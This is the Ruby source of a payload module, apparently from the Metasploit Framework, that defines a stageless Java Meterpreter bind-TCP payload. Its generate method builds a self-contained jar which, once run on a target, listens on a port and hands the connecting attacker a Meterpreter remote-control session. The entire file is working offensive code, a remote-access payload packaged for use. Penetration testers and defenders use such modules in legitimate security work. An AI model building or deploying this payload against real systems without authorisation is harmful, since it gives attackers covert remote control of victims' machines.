##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Java::BindTcp
  include Msf::Payload::Java::MeterpreterLoader

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Java Meterpreter, Bind TCP Stageless',
        'Description' => 'Run a meterpreter server in Java. Bind TCP. Self-contained jar.',
        'Author' => ['mihi', 'egypt', 'OJ Reeves'],
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Handler' => Msf::Handler::BindTcp,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_Java_Java
      )
    )
  end

  def generate(opts = {})
    stage_meterpreter(opts.merge(stageless: true))
  end
end
